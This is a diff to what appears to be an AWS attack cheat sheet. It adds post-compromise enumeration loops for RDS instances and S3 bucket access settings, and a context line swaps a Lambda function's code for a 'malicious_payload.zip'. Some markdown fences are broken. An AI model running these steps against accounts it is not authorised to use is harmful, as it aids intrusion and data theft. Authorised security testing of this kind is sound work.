@@ -65,3 +65,38 @@ Bash
 aws lambda update-function-code \
   --function-name target-function \
   --zip-file fileb://malicious_payload.zip
+
+## 4. Service Enumeration (Post-Compromise)
+
+### RDS Database Enumeration
+Scan all regions for RDS instances to find databases containing sensitive data.
+
+```bash
+# List all RDS instances across all regions
+for region in $(aws ec2 describe-regions --query "Regions[].RegionName" --output text); do
+    echo "[+] Checking region: $region"
+    aws rds describe-db-instances --region "$region" --query 'DBInstances[*].DBInstanceIdentifier' --output text 2>/dev/null
+done
+bash
+# Detailed RDS enumeration (shows engine, public access, endpoints, security groups)
+for region in $(aws ec2 describe-regions --query "Regions[].RegionName" --output text); do
+    instances=$(aws rds describe-db-instances --region "$region" --query 'DBInstances[*].DBInstanceIdentifier' --output text 2>/dev/null)
+    if [ -n "$instances" ] && [ "$instances" != "None" ]; then
+        echo "=================================================="
+        echo "[+] Region Found with RDS: $region"
+        echo "=================================================="
+        aws rds describe-db-instances --region "$region" \
+            --query 'DBInstances[*].{Identifier:DBInstanceIdentifier,Engine:Engine,PubliclyAccessible:PubliclyAccessible,Endpoint:Endpoint.Address,SecurityGroups:VpcSecurityGroups[*].VpcSecurityGroupId}' \
+            --output json
+    fi
+done
+S3 Bucket Enumeration
+Enumerate all S3 buckets and check for public access misconfigurations.
+
+bash
+# Check S3 buckets for public access block and policies
+for bucket in $(aws s3api list-buckets --query "Buckets[].Name" --output text); do
+    bpa=$(aws s3api get-public-access-block --bucket "$bucket" --output json 2>/dev/null || echo '{"PublicAccessBlockConfiguration": "Not Configured"}')
+    policy=$(aws s3api get-bucket-policy --bucket "$bucket" --query 'Policy' --output text 2>/dev/null || echo "None")
+    jq -n --arg b "$bucket" --argjson bp "$bpa" --arg pol "$policy" '{Bucket: $b, PublicAccessBlock: $bp, Policy: $pol}'
+done
